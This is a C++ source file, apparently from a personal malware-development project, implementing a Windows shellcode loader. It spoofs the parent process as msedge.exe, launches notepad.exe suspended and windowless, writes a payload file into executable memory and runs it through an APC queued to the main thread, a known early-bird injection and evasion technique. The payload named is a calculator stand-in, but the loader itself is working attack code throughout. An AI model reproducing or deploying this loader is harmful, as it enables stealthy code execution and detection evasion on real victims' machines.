#include <iostream>
#include "Support.h"
#include <vector>
#include <Windows.h>
#include <fstream>

using namespace std;

vector<BYTE> ReadBinaryFile(const string& filename) {
    ifstream file(filename, ios::binary);
    if (!file) {
        const auto& err = errno;

        char error_message[256];

        strerror_s(error_message, sizeof(error_message), err);

        cerr << "Could not open file: " << filename << ". Error: " << error_message << endl;
        return {};  // Return an empty vector
    }

    // Read file's content
    vector<BYTE> data((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
    file.close();
    return data;
}

int main(int argc, char* argv[])
{
    DWORD EdgeProcessId;
    LPCWSTR TargetParentProcess = L"msedge.exe"; 

    GetParentProcessPPID(TargetParentProcess, &EdgeProcessId);

    vector<BYTE> PayloadVector = ReadBinaryFile("C:\\Users\\orhei\\source\\repos\\Malware\\x64\\Debug\\calc.bin");

    const DWORD attributeCount = 1;
    
    LPSTARTUPINFOEXW si = new STARTUPINFOEXW();
    si->StartupInfo.cb = sizeof(STARTUPINFOEXW);

    SIZE_T lpSize = 0;

    // call once to get lpSize
    InitializeProcThreadAttributeList(
        NULL,
        attributeCount,
        0,
        &lpSize);

    // allocate the memory
    si->lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(lpSize);

    // call again to initialise the list
    InitializeProcThreadAttributeList(
        si->lpAttributeList,
        attributeCount,
        0,
        &lpSize);

    // open a handle to the desired parent
    HANDLE hParent = OpenProcess(
        PROCESS_CREATE_PROCESS,
        FALSE,
        EdgeProcessId); // hardcoded pid of explorer

    // update the list
    UpdateProcThreadAttribute(
        si->lpAttributeList,
        NULL,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParent,
        sizeof(HANDLE),
        NULL,
        NULL);

    // create process
    PPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
    wchar_t cmd[] = L"C:\\Windows\\System32\\notepad.exe\0";

    // CreateProcessA(
    // "C:\\Windows\\System32\\mspaint.exe", 
    // NULL, NULL, NULL, TRUE, 
    // , 
    // NULL,
    // NULL, 
    // reinterpret_cast<LPSTARTUPINFOA>(&si), &pi);

    // LPVOID ba = (LPVOID)VirtualAllocEx(pi.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    CreateProcessW(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        &si->StartupInfo,
        pi);

    LPVOID ba = (LPVOID)VirtualAllocEx(pi->hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    SIZE_T* nb = 0;
    BOOL res = WriteProcessMemory(pi->hProcess, ba, &PayloadVector[0], PayloadVector.size(), nb);

    QueueUserAPC((PAPCFUNC)ba, pi->hThread, 0);
    ResumeThread(pi->hThread);
    CloseHandle(pi->hThread);

    // print the pid
    printf("Current process PID: %d\n", pi->dwProcessId);
    printf("Parent process PID: %d\n", EdgeProcessId);

    // cleanup list and memory
    DeleteProcThreadAttributeList(si->lpAttributeList);
    free(si->lpAttributeList);

    // close handle to parent
    CloseHandle(hParent);

    return 0;
}
